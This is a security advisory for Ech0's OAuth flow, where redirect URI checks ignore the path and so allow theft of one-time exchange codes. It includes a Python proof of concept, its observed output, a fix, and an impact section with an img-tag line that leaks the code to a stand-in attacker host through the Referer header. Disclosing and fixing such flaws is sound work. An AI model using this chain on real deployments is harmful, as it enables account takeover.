# [H] Ech0's OAuth redirect URI validation ignores path component, enables exchange-code theft

## Summary
Severity: High
Advisory: GHSA-p64j-f4x9-wq66
CWE: CWE-1173, CWE-601
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-p64j-f4x9-wq66
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/Ech0` — affected >=0 <1.4.8-0.20260503040728-a7e8b8e84bd1

## Details
## Summary

`parseAndValidateClientRedirect` at `internal/service/auth/auth.go:448` validates OAuth client-redirect URIs by comparing only scheme and host against the admin-configured allowlist. Path, query, and fragment are ignored. The initiator at `/oauth/:provider/login` embeds the caller-supplied `redirect_uri` verbatim into the signed state JWT without any validation at login time. Alice submits a crafted `redirect_uri` whose host matches an allowed origin but whose path points to any page on that host. After the provider exchange, Ech0 redirects the victim to the attacker-chosen path with the one-time exchange code in the query string. If the chosen path leaks the URL via Referer, analytics, or an open redirect, the attacker trades the code at `POST /api/auth/exchange` for the victim's access and refresh tokens. RFC 6749 §3.1.2 requires exact redirect URI matching.

## Details

Validation at `internal/service/auth/auth.go:448`:

```go
matched := false
for _, item := range allowed {
    allowURL, parseErr := url.Parse(strings.TrimSpace(item))
    if parseErr != nil || allowURL == nil || allowURL.Host == "" {
        continue
    }
    if strings.EqualFold(redirectURL.Scheme, allowURL.Scheme) &&
       strings.EqualFold(redirectURL.Host, allowURL.Host) {
        matched = true
        break
    }
}
```

Scheme and host compared via `EqualFold`. Path, query, fragment all ignored. An allowlist entry of `https://myecho.example.com/dashboard` matches every `https://myecho.example.com/<anything>` the attacker sends.

Login flow at `internal/service/auth/auth.go:141` (`GetOAuthLoginURL`) and the handler at `internal/handler/auth/oauth.go:43`:

```go
redirectURI := ctx.Query("redirect_uri")
redirectURL, err := h.authService.GetOAuthLoginURL(provider, redirectURI)
// ...
ctx.Redirect(302, redirectURL)
```

No validation at login. The raw `redirect_uri` query parameter is passed to `GetOAuthLoginURL`, which encodes it into the signed state JWT alongside the provider name and nonce. The state JWT travels through the OAuth provider and returns on the callback.

At callback time, `parseAndValidateClientRedirect(oauthState.Redirect)` fires at `internal/service/auth/auth.go:372` and `:427` inside the callback handler chain. Scheme and host are the only gates on the attacker-chosen URI.

After validation, the server generates a one-time exchange code and redirects the browser to the attacker-chosen path:

```
302 Location: https://myecho.example.com/<attacker-path>?code=<one-time-exchange-code>
```

The code is valid at the public endpoint `POST /api/auth/exchange` for up to 60 seconds (single-use). An attacker who reads the code from the URL trades it for the victim's access token and refresh token.

## Proof of Concept

Default install with OAuth2 configured. Admin allows `https://myecho.example.com/dashboard` as the return URL; Alice sends a crafted login link whose redirect points elsewhere on the same host:

```python
import requests, urllib.parse, base64, json
TARGET = "http://localhost:8300"

# Admin setup: enable OAuth with one allowed return URL (dashboard).
owner = requests.post(f"{TARGET}/api/login",
                      json={"username": "owner", "password": "owner-pw"}
                     ).json()["data"]["access_token"]
requests.put(f"{TARGET}/api/oauth2/settings",
             headers={"Authorization": f"Bearer {owner}",
                      "content-type": "application/json"},
             json={"enable": True, "provider": "github",
                   "client_id": "poc-client-id", "client_secret": "poc-client-secret",
                   "redirect_uri": f"{TARGET}/oauth/github/callback",
                   "scopes": ["read:user"],
                   "auth_url": "https://github.com/login/oauth/authorize",
                   "token_url": "https://github.com/login/oauth/access_token",
                   "user_info_url": "https://api.github.com/user",
                   "auth_redirect_allowed_return_urls": ["https://myecho.example.com/dashboard"]})

# Alice's link to the victim. Same host, different path.
for attacker_uri in [
    "https://myecho.example.com/dashboard",            # control, allowed
    "https://myecho.example.com/attacker-chosen-path", # path bypass
    "https://attacker.example/foo",                    # different host, should also fail
]:
    url = f"{TARGET}/oauth/github/login?redirect_uri=" + urllib.parse.quote(attacker_uri)
    r = requests.get(url, allow_redirects=False)
    loc = r.headers.get("Location", "")
    state_jwt = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).get("state", [""])[0]
    pad = lambda s: s + "=" * (-len(s) % 4)
    payload = json.loads(base64.urlsafe_b64decode(pad(state_jwt.split(".")[1])))
    print(f"  redirect_uri={attacker_uri!r}")
    print(f"    login HTTP: {r.status_code}")
    print(f"    state JWT redirect: {payload.get('redirect')!r}")
```

Observed on v4.5.6:

```
redirect_uri='https://myecho.example.com/dashboard'
  login HTTP: 302
  state JWT redirect: 'https://myecho.example.com/dashboard'
redirect_uri='https://myecho.example.com/attacker-chosen-path'
  login HTTP: 302
  state JWT redirect: 'https://myecho.example.com/attacker-chosen-path'
redirect_uri='https://attacker.example/foo'
  login HTTP: 302
  state JWT redirect: 'https://attacker.example/foo'
```

All three `redirect_uri` values sail through login with no validation; the state JWT carries the attacker-chosen URL verbatim. The first two pass the callback's scheme+host check against the `dashboard` allowlist entry and the server redirects to the attacker-chosen path with the exchange code appended. The third (different host) fails the callback's allowlist check, so it does not land; the point is that no validation occurs at login time, only at callback, and the callback check ignores path entirely.

## Impact

Alice delivers a single link to Bob (phishing email, social-engineering message, embedded redirect in a compromised site). Bob clicks, completes OAuth as himself, and lands on the attacker-chosen path on the legitimate Ech0 host with `?code=<one-time>` in the URL. Three paths to full account takeover follow:

- **Referer leakage.** A single `<img src="https://attacker.site/log">` or `<script src>` on the attacker-chosen path sends the victim's full URL (including the code) to the attacker in the Referer header.
- **Analytics and third-party scripts.** Any page on the allowlisted host that loads Google Analytics, Sentry, or Segment reports the URL (including the code) to those services. Any attacker with access to those accounts reads the code.
- **Open-redirect chains.** If any path on the allowlisted host has an open-redirect bug, the attacker targets it and bounces the URL (with the code) to their server.

The code is trade-in-able at `POST /api/auth/exchange`, which is public. The exchange returns the victim's access_token and refresh_token. Full account takeover follows.

Preconditions: Ech0's OAuth is configured (opt-in), one allowlisted host has any path that leaks URLs, and the attacker reaches the victim with a crafted link. RFC 6749 §3.1.2 exists precisely to prevent this chain.

## Recommended Fix

Require exact redirect URI matching per the spec. Compare scheme, host, and path together:

```go
redirectNorm := strings.ToLower(redirectURL.Scheme) + "://" +
                strings.ToLower(redirectURL.Host) +
                redirectURL.Path
for _, item := range allowed {
    allowURL, parseErr := url.Parse(strings.TrimSpace(item))
    if parseErr != nil || allowURL == nil || allowURL.Host == "" {
        continue
    }
    allowNorm := strings.ToLower(allowURL.Scheme) + "://" +
                 strings.ToLower(allowURL.Host) +
                 allowURL.Path
    if redirectNorm == allowNorm {
        matched = true
        break
    }
}
```

Validate the `redirect_uri` at login time too, so a malformed value never enters the state JWT:

```go
func (s *AuthService) GetOAuthLoginURL(provider, redirectURI string) (string, error) {
    if redirectURI != "" {
        if _, err := s.parseAndValidateClientRedirect(redirectURI); err != nil {
            return "", err
        }
    }
    // ... rest unchanged
}
```

Document the exact-match semantics in the admin panel. Every allowlisted return URL needs the full path the front-end lands on.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-p64j-f4x9-wq66
- https://github.com/lin-snow/Ech0/commit/a7e8b8e84bd1e3db090dfb720f2c6c433356b442
- https://github.com/lin-snow/Ech0
